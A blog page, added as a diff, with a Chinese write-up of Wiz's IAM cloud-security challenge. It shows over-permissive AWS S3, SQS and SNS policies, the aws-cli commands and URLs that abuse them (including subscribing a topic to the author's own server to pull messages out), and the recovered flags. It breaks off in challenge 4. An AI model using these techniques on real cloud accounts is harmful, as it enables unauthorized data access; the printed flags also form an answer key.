@@ -1,0 +1,881 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="Muscial Blog">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="https://muscial.github.io/img/bizhi.jpg">
+    <meta property="twitter:image" content="https://muscial.github.io/img/bizhi.jpg" />
+    
+
+    
+    <meta name="title" content="WIZ IAM挑战赛wp" />
+    <meta property="og:title" content="WIZ IAM挑战赛wp" />
+    <meta property="twitter:title" content="WIZ IAM挑战赛wp" />
+    
+
+    
+    <meta name="description" content="Muscial">
+    <meta property="og:description" content="Muscial" />
+    <meta property="twitter:description" content="Muscial" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="Muscial">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>WIZ IAM挑战赛wp | Muscial的博客 | 保持冷静，奋不顾身</title>
+
+    <link rel="canonical" href="/post/wiz_iam/">
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link href="https://cdn.jsdelivr.net/gh/FortAwesome/Font-Awesome@5.15.1/css/all.css" rel="stylesheet" type="text/css">
+
+    
+    
+
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    <script src="/js/lazysizes.min.js"></script>
+
+    
+    
+
+</head>
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">Muscial Blog</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">All Posts</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/tech">tech</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/archive/">ARCHIVE</a></li>
+                    
+                        <li><a href="/notes/">NOTES</a></li>
+                    
+                        <li><a href="/about/">ABOUT</a></li>
+                    
+
+                    
+		    <li>
+                        <a href="/search"><i class="fa fa-search"></i></a>
+		    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/bizhi.jpg')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                    </div>
+                    <h1>WIZ IAM挑战赛wp</h1>
+                    <h2 class="subheading">Cloud Security</h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                Muscial
+                             
+                            on 
+                            Monday, January 1, 0001
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <h1 id="wiz-iam挑战赛wp">WIZ IAM挑战赛wp</h1>
+<h2 id="前言">前言</h2>
+<p>aws关于云安全的一个挑战赛，学的时候一直查官方文档，确实有的不好找。收获还是蛮多的</p>
+<p>aws cil文档比概念文档好用（流汗了</p>
+<!-- raw HTML omitted -->
+<h3 id="1-buckets-of-fun">1. Buckets of Fun</h3>
+<p>直接是一个bucket的策略</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Version&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;2012-10-17&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Statement&#34;</span><span style="color:#ff79c6">:</span> [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Effect&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Allow&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Principal&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;*&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Action&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;s3:GetObject&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Resource&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*&#34;</span>
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Effect&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Allow&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Principal&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;*&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Action&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;s3:ListBucket&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Resource&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;arn:aws:s3:::thebigiamchallenge-storage-9979f4b&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Condition&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;StringLike&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#f1fa8c">&#34;s3:prefix&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;files/*&#34;</span>
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>&ldquo;Action&rdquo;: &ldquo;s3:GetObject&rdquo;,可以看对象</p>
+<p>&ldquo;Resource&rdquo;: &ldquo;arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*&ldquo;给了桶子的url</p>
+<p>拼接一下</p>
+<p><a href="https://thebigiamchallenge-storage-9979f4b.s3.amazonaws.com/">https://thebigiamchallenge-storage-9979f4b.s3.amazonaws.com</a></p>
+<!-- raw HTML omitted -->
+<p>凭借第一个对象路由即可</p>
+<p><a href="https://thebigiamchallenge-storage-9979f4b.s3.amazonaws.com/files/flag1.txt">https://thebigiamchallenge-storage-9979f4b.s3.amazonaws.com/files/flag1.txt</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{wiz<span style="color:#ff79c6">:</span>exposed<span style="color:#ff79c6">-</span>storage<span style="color:#ff79c6">-</span>risky<span style="color:#ff79c6">-</span>as<span style="color:#ff79c6">-</span>usual}
+</span></span></code></pre></div><h3 id="2googleanalytics">2.Google~~ Analytics</h3>
+<h2 id="描述">描述</h2>
+<p>我们专门为这一挑战创建了自己的分析系统。我们认为它非常好，我们甚至在这个页面上使用了它。会出什么问题？</p>
+<h2 id="题解">题解</h2>
+<p>先看下策略</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Version&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;2012-10-17&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Statement&#34;</span><span style="color:#ff79c6">:</span> [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Effect&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Allow&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Principal&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;*&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Action&#34;</span><span style="color:#ff79c6">:</span> [
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;sqs:SendMessage&#34;</span>,
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;sqs:ReceiveMessage&#34;</span>
+</span></span><span style="display:flex;"><span>            ],
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Resource&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2&#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>Action对应的策略是sqs的权限，看样子是sqs的服务</p>
+<p>SQS (Simple Queue Service) 可以用来帮助不同的应用程序之间进行可靠的消息传递，它就像是一个消息中转站，可以把消息从一个地方发送到另一个地方，确保消息的安全送达和处理，让应用程序之间更好地进行通信和协作。</p>
+<p>这种直接去看awscil 的文档，给了服务和权限，直接调用功能</p>
+<p>命令格式</p>
+<p>aws 服务 权限 —参数</p>
+<p>receviemessage文档</p>
+<p><a href="https://docs.aws.amazon.com/cli/latest/reference/sqs/receive-message.html">https://docs.aws.amazon.com/cli/latest/reference/sqs/receive-message.html</a></p>
+<p>queue组成</p>
+<p><a href="https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-queue-message-identifiers.html">https://docs.aws.amazon.com/AWSSimpleQueueService/latest/SQSDeveloperGuide/sqs-queue-message-identifiers.html</a></p>
+<p>根据官方文档，要调用 Receive Message 接口，需要知道 Queue URL，Queue URL 的主要构成部分就是 Account ID 和 Queue，在题目的 Policy 中给出了 Account ID 和 Queue 的值，那么我们就可以构造这个 Queue URL 了，构造后的 Queue URL 为：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>https<span style="color:#ff79c6">:</span><span style="color:#6272a4">//sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
+</span></span></span></code></pre></div><p>payload</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>aws sqs receive<span style="color:#ff79c6">-</span>message <span style="color:#ff79c6">--</span>queue<span style="color:#ff79c6">-</span>url https<span style="color:#ff79c6">:</span><span style="color:#6272a4">//sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{wiz<span style="color:#ff79c6">:</span>you<span style="color:#ff79c6">-</span>are<span style="color:#ff79c6">-</span>at<span style="color:#ff79c6">-</span>the<span style="color:#ff79c6">-</span>front<span style="color:#ff79c6">-</span><span style="color:#ff79c6">of</span><span style="color:#ff79c6">-</span>the<span style="color:#ff79c6">-</span>queue}
+</span></span></code></pre></div><h3 id="3enable-push-notifications">3.Enable Push Notifications</h3>
+<p><strong>We got a message for you. Can you get it?</strong></p>
+<p>看下策略先</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Version&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;2008-10-17&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Id&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Statement1&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Statement&#34;</span><span style="color:#ff79c6">:</span> [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Sid&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Statement1&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Effect&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Allow&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Principal&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;AWS&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;*&#34;</span>
+</span></span><span style="display:flex;"><span>            },
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Action&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;SNS:Subscribe&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Resource&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Condition&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;StringLike&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#f1fa8c">&#34;sns:Endpoint&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;*@tbic.wiz.io&#34;</span>
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    ]
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>SNS的一个服务，权利（接口 是订阅 Subscribe</p>
+<p>SNS，全称Social Networking Services，即社会性网络服务，专指旨在帮助人们建立社会性网络的互联网应用服务（微博推特）</p>
+<p>翻下aws sns cil 文档</p>
+<p><a href="https://docs.aws.amazon.com/cli/latest/reference/sns/subscribe.html">https://docs.aws.amazon.com/cli/latest/reference/sns/subscribe.html</a></p>
+<pre tabindex="0"><code>aws sns subscribe \
+    --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications \
+    --protocol http \
+    --notification-endpoint http://4.x.x.x:8888/@tbic.wiz.io
+</code></pre><p>本来想找个tbic.wiz.io的邮箱，网上没这个邮箱</p>
+<p>但是可以支持http协议，通过访问vps不存在的路由也可以nc接受到</p>
+<p>vps</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Type&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;SubscriptionConfirmation&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;MessageId&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;ac9f9577-8903-4db6-b2d5-cebf73d8280c&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Token&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;2336412f37fb687f5d51e6e2425ba1f2505072a050ca3f4669c8a8d4978b09ce80eef534fdef6ea02a76f78cc4bd19b25d8e4c1b5cd9124699531198f7310838acf9a12ab60bc19511b0b1fbcd92d9b2a40b657459c4f61994d3ed993fd446effc2a6c303ce2615c8e2e1fb9cb72756329ee54581d571cfc3ada460f2248b78e&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;TopicArn&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Message&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;You have chosen to subscribe to the topic arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications.\nTo confirm the subscription, visit the SubscribeURL included in this message.&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;SubscribeURL&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&amp;TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&amp;Token=2336412f37fb687f5d51e6e2425ba1f2505072a050ca3f4669c8a8d4978b09ce80eef534fdef6ea02a76f78cc4bd19b25d8e4c1b5cd9124699531198f7310838acf9a12ab60bc19511b0b1fbcd92d9b2a40b657459c4f61994d3ed993fd446effc2a6c303ce2615c8e2e1fb9cb72756329ee54581d571cfc3ada460f2248b78e&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Timestamp&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;2024-01-28T04:23:42.112Z&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;SignatureVersion&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;1&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Signature&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;erCk7WH9rWQjUpfBYP03sShjEYcAbbw9nKGbhKqL6IzXED7eK9Mxna5a85uqs5pb8Xnco2sYpm0nimHQ2iH8pSyMddBqU/o103qfz6EaK5Faxy1b1C/GViYspxWnoNEh5Vt0ESrZMuAV/3daUyD8pLPdZb/j/ebMTL2O3WEmjsB1yxDPMS0SgrAdi03t+dBzcEh2vzyBgu7ipy237gE/riBlQ839rglKS/v7jBYOcUGDrBNTWAuJPKyUeFPTpXj9PSrhu3cSZZWKEJyv32sGaI9JI8S1EM2f/DVHkgUscXTSwfyxkTsBCjCyQk1aaStI+4hDx6joMb+eANU/jtAOQA==&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;SigningCertURL&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;https://sns.us-east-1.amazonaws.com/SimpleNotificationService-60eadc530605d63b8e62a523676ef735.pem&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>通过验证早期 <code>Subscribe</code> 操作发送到端点的令牌来验证端点所有者接收消息的意图。如果令牌有效，则该操作将创建一个新订阅并返回其 Amazon 资源名称 （ARN）。仅当标志设置为“true”时， <code>AuthenticateOnUnsubscribe</code> 此调用才需要 AWS 签名。</p>
+<p>也就是说 订阅了要确定</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>aws sns confirm<span style="color:#ff79c6">-</span>subscription <span style="color:#ff79c6">\</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">--</span>topic<span style="color:#ff79c6">-</span>arn arn<span style="color:#ff79c6">:</span>aws<span style="color:#ff79c6">:</span>sns<span style="color:#ff79c6">:</span>us<span style="color:#ff79c6">-</span>east<span style="color:#ff79c6">-</span><span style="color:#bd93f9">1</span><span style="color:#ff79c6">:</span><span style="color:#bd93f9">092297851374</span><span style="color:#ff79c6">:</span>TBICWizPushNotifications <span style="color:#ff79c6">\</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">--</span>token <span style="color:#bd93f9">2336412</span>f37fb687f5d51e6e2425ba1f2505072a050ca3e9dc5a19f0545bf18f9d1ee82058e3bd04d813bb01baecf3cbb945a154d26f928087114e07b4da9b67f10ba357633c0246b4372c3c28b8724193f882f9c4d067eb6c4a0091b3e0b76158a9d92b092136382ddacc86b94d1a71cbed921324aaf9bbc5732b1d183b53382
+</span></span></code></pre></div><p>不知道为啥我要报错没权限</p>
+<p>但是可以点链接验证订阅，更方便</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span><span style="color:#f1fa8c">&#34;SubscribeURL&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;https://sns.us-east-1.amazonaws.com/?Action=ConfirmSubscription&amp;TopicArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&amp;Token=2336412f37fb687f5d51e6e2425ba1f2505072a050ca3f4669c8a8d4978b09ce80eef534fdef6ea02a76f78cc4bd19b25d8e4c1b5cd9124699531198f7310838acf9a12ab60bc19511b0b1fbcd92d9b2a40b657459c4f61994d3ed993fd446effc2a6c303ce2615c8e2e1fb9cb72756329ee54581d571cfc3ada460f2248b78e&#34;</span>
+</span></span></code></pre></div><p>SNS服务器就可以直接发message到vps上了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Type&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Notification&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;MessageId&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;f523c1ba-941f-540d-8a32-9f957fb3d6ae&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;TopicArn&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Message&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;{wiz:always-suspect-asterisks}&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Timestamp&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;2024-01-28T05:43:08.390Z&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;SignatureVersion&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;1&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;Signature&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;m3j7hkum0rs1vOODibixiBXXy9pwZBs/k/IsUO42t9632vld9EPKO1cvLkbtTxV6baAnVGpt/oV3TyURcodKNz2YCwStqSYRUfgnamk1n95F2MuW0p7SMqJAoVVACFRVbiUHfOl4JoFkMe8lxqFfEVsmFf+N9RA2VFOMGOJcs9dyvq5VJMmYNF2hDAhpsPXx52S0AEwAuKhUjiJKsQgZQzyh15EDLkrNk1lXpHYOtKtlQHS+jIxOzwXm4EECMGI5NyrQNFVQzDsYOqndCtaLYQ1wEH7H7usRad9Qc8Oj/Uh6Q9DXFfl3wTuCnDLzoM9aO6NLG3VB/PMg56mjmuqq3A==&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;SigningCertURL&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;https://sns.us-east-1.amazonaws.com/SimpleNotificationService-60eadc530605d63b8e62a523676ef735.pem&#34;</span>,
+</span></span><span style="display:flex;"><span>  <span style="color:#f1fa8c">&#34;UnsubscribeURL&#34;</span> <span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;https://sns.us-east-1.amazonaws.com/?Action=Unsubscribe&amp;SubscriptionArn=arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications:0333699d-ae52-4080-a5c9-6fa967c9ae20&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="4admin-only">4.Admin only?</h3>
+<p>We learned from our mistakes from the past. Now our bucket only allows access to one specific admin user. Or does it?</p>
+<p>策略</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-jsx" data-lang="jsx"><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Version&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;2012-10-17&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#f1fa8c">&#34;Statement&#34;</span><span style="color:#ff79c6">:</span> [
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Effect&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Allow&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Principal&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;*&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Action&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;s3:GetObject&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Resource&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*&#34;</span>
+</span></span><span style="display:flex;"><span>        },
+</span></span><span style="display:flex;"><span>        {
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Effect&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;Allow&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Principal&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;*&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Action&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;s3:ListBucket&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Resource&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321&#34;</span>,
+</span></span><span style="display:flex;"><span>            <span style="color:#f1fa8c">&#34;Condition&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;StringLike&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#f1fa8c">&#34;s3:prefix&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;files/*&#34;</span>
+</span></span><span style="display:flex;"><span>                },
+</span></span><span style="display:flex;"><span>                <span style="color:#f1fa8c">&#34;ForAllValues:StringLike&#34;</span><span style="color:#ff79c6">:</span> {
+</span></span><span style="display:flex;"><span>                    <span style="color:#f1fa8c">&#34;aws:PrincipalArn&#34;</span><span style="color:#ff79c6">:</span> <span style="color:#f1fa8c">&#34;arn:aws:iam::133713371337:user/admin&#34;</span>
+</span></span><span style="display:flex;"><span>                }
+</span></span><span style="display:flex;"><span>            }
